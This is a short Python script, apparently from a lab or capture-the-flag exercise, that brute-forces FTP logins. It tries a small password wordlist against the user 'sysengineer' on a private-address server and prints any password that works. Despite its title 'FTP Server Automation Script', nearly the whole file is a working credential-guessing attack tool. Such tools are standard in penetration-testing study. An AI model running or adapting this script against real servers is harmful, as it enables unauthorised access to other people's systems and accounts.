import ftplib

def FTPAccess(host, port, user, password):
    server = ftplib.FTP() # initialize FTP server object
    print(f"[!] Trying", password)
    try:
        server.connect(host, port, timeout=5) # Connect to FTP server with a timeout of 5

        server.login(user, password)         # login using the credentials (user & password)
    except ftplib.error_perm:
        return False  # login failed, wrong credentials
    else:
        # correct credentials
        print("[+] Found credentials to FTP Server:", password)
        return True

def main(): 
    print("FTP Server Automation Script")
    
    host = "10.10.10.3" # hostname or IP address of the FTP server
    
    user = "sysengineer" # username of the FTP server
    
    port = 21 # port of FTP
    
    passwords = ["james1", "james"] # read the wordlist of passwords
    print("[+] Passwords to try:", len(passwords))

    for password in passwords:
        if FTPAccess(host, port, user, password):
            break

if __name__ == "__main__":
  main()
